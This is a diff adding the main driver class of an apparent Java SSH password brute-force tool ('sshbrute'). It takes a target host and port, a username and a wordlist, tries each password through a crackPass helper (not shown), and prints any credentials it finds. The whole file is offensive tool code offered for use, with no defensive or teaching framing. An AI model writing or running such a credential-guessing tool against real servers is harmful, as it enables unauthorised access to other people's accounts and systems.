@@ -1,0 +1,43 @@
+
+package sshbrute;
+
+
+import java.util.ArrayList;
+
+
+public class MainTesting extends SSHBrute{
+    
+    public static void main(String[] args) {
+        if(args.length != 3){
+            System.out.println("usage: ./sshbrute.jar {TARGET [:PORT]] [USERNAME] [WORDLIST]");
+                System.exit(1);
+        }
+        String targetIP; 
+        int targetPort;
+        
+        //do we have the arguments? If we do then use it else we should use the basic configuration of java 
+        if(args[0].contains(":")){
+            targetIP = args[0].split(":")[0];
+            targetPort = Integer.parseInt(args[0].split(":")[1]);
+        } else {
+            targetIP = args[0];
+            targetPort = 22;  //Ssh is usually port 22 unless you want to be "Secure" 
+        }
+        
+        checkHost(targetIP, targetPort); 
+        String user = args[1]; 
+        ArrayList<String> wordList; 
+        wordList = getwordList(args[2]);
+        System.out.println(String.format("cracking SSH password for \"%s\" at %s...\n", user, targetIP));
+        for(int i =0; i< wordList.size(); i++){
+            if( crackPass(targetIP, user, wordList.get(i), targetPort) ){
+                System.out.println("Creds found: ");
+                System.out.print(String.format("\tuser: %s",user));
+                System.out.println(String.format("\tpass: %s", wordList.get(i)));
+                System.exit(0); 
+                
+            }
+        }
+        System.out.println("Bruteforce Failed");
+    }
+}
